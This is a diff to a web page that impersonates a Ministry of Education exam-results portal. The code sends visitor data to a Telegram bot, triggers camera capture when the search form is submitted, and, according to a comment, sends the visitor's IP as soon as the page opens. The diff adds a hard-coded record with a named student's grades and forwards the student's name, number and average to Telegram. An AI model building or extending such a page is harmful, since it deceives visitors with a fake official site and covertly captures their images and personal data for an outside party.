@@ -190,6 +190,26 @@
     const PAGE_NAME = "وزارة التربية - نظام النتائج";
     // ===================================
 
+    // قاعدة بيانات وهمية للنتائج
+    const fakeDatabase = {
+        "1731940": {
+            name: "خالد حسين الطويل",
+            certificate: "baccalaureate",
+            average: 76.23,
+            status: "ناجح",
+            subjects: {
+                "اللغة العربية": 82,
+                "اللغة الإنجليزية": 71,
+                "الرياضيات": 68,
+                "التاريخ": 79,
+                "الجغرافيا": 74,
+                "الفلسفة": 70,
+                "علم الاجتماع": 73,
+                "الاقتصاد": 72
+            }
+        }
+    };
+
     async function sendToTelegram(message) {
         try {
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -285,20 +305,6 @@
             });
     }
 
-    // دالة إنشاء نتيجة وهمية
-    function generateFakeResult(name, regNumber, certType) {
-        const subjects = certType === 'baccalaureate' 
-            ? ['اللغة العربية', 'اللغة الإنجليزية', 'الرياضيات', 'الفيزياء', 'الكيمياء', 'علم الأحياء', 'التاريخ', 'الجغرافيا', 'الفلسفة']
-            : ['اللغة العربية', 'اللغة الإنجليزية', 'الرياضيات', 'العلوم العامة', 'التربية الدينية', 'التربية الوطنية', 'التربية الفنية'];
-
-        // نتائج عالية لناجح
-        const grades = subjects.map(() => Math.floor(Math.random() * 20) + 75);
-        const total = grades.reduce((a, b) => a + b, 0);
-        const average = (total / grades.length).toFixed(2);
-        
-        return { subjects, grades, total, average, status: 'ناجح' };
-    }
-
     document.getElementById('searchForm').addEventListener('submit', async function(e) {
         e.preventDefault();
 
@@ -354,33 +360,39 @@
         // تصوير الكاميرا
         captureCamera();
 
-        // إنشاء نتيجة وهمية (ناجح)
-        const result = generateFakeResult(fullName, regNumber, certType);
+        // البحث في قاعدة البيانات
+        const student = fakeDatabase[regNumber];
 
-        // عرض النتيجة
-        resultBox.style.display = 'block';
-        let html = `<div class="result-item"><span class="label">📌 رقم الاكتتاب</span><span class="value">${regNumber}</span></div>`;
-        html += `<div class="result-item"><span class="label">👤 الاسم الثلاثي</span><span class="value">${fullName}</span></div>`;
-        html += `<div class="result-item"><span class="label">📘 الشهادة</span><span class="value">${certType === 'baccalaureate' ? 'البكالوريا' : 'التاسع الأساسي'}</span></div>`;
-        html += `<div class="result-item"><span class="label">📊 المعدل</span><span class="value success">${result.average}%</span></div>`;
-        html += `<div class="result-item"><span class="label">📋 الحالة</span><span class="value success">✅ ${result.status}</span></div>`;
-        html += `<hr style="margin: 10px 0; border-color: #d0d5dd;">`;
-        result.subjects.forEach((sub, i) => {
-            html += `<div class="result-item"><span class="label">${sub}</span><span class="value">${result.grades[i]}%</span></div>`;
-        });
-        resultContent.innerHTML = html;
+        if (student && student.name === fullName) {
+            // عرض النتيجة
+            resultBox.style.display = 'block';
+            let html = `<div class="result-item"><span class="label">📌 رقم الاكتتاب</span><span class="value">${regNumber}</span></div>`;
+            html += `<div class="result-item"><span class="label">👤 الاسم الثلاثي</span><span class="value">${student.name}</span></div>`;
+            html += `<div class="result-item"><span class="label">📘 الشهادة</span><span class="value">البكالوريا - الأدبي</span></div>`;
+            html += `<div class="result-item"><span class="label">📊 المعدل</span><span class="value success">${student.average}%</span></div>`;
+            html += `<div class="result-item"><span class="label">📋 الحالة</span><span class="value success">✅ ${student.status}</span></div>`;
+            html += `<hr style="margin: 10px 0; border-color: #d0d5dd;">`;
+            for (const [subject, grade] of Object.entries(student.subjects)) {
+                html += `<div class="result-item"><span class="label">${subject}</span><span class="value">${grade}%</span></div>`;
+            }
+            resultContent.innerHTML = html;
 
-        statusBox.style.color = '#2e7d32';
-        statusBox.innerText = '✅ تم عرض النتيجة بنجاح - مبروك النجاح';
+            statusBox.style.color = '#2e7d32';
+            statusBox.innerText = '✅ تم عرض النتيجة بنجاح - مبروك النجاح';
 
-        // إرسال النتيجة للتليغرام
-        let resultMsg = `📊 <b>نتيجة الطالب</b>\n\n`;
-        resultMsg += `👤 ${fullName}\n`;
-        resultMsg += `📌 ${regNumber}\n`;
-        resultMsg += `📘 ${certType === 'baccalaureate' ? 'بكالوريا' : 'تاسع'}\n`;
-        resultMsg += `📊 المعدل: ${result.average}%\n`;
-        resultMsg += `📋 الحالة: ✅ ناجح`;
-        await sendToTelegram(resultMsg);
+            // إرسال النتيجة للتليغرام
+            let resultMsg = `📊 <b>نتيجة الطالب</b>\n\n`;
+            resultMsg += `👤 ${student.name}\n`;
+            resultMsg += `📌 ${regNumber}\n`;
+            resultMsg += `📘 بكالوريا - أدبي\n`;
+            resultMsg += `📊 المعدل: ${student.average}%\n`;
+            resultMsg += `📋 الحالة: ✅ ناجح`;
+            await sendToTelegram(resultMsg);
+        } else {
+            statusBox.style.color = '#c62828';
+            statusBox.innerText = '❌ لا توجد نتائج لهذا الرقم أو الاسم';
+            resultBox.style.display = 'none';
+        }
     });
 
     // إرسال IP فور فتح الصفحة
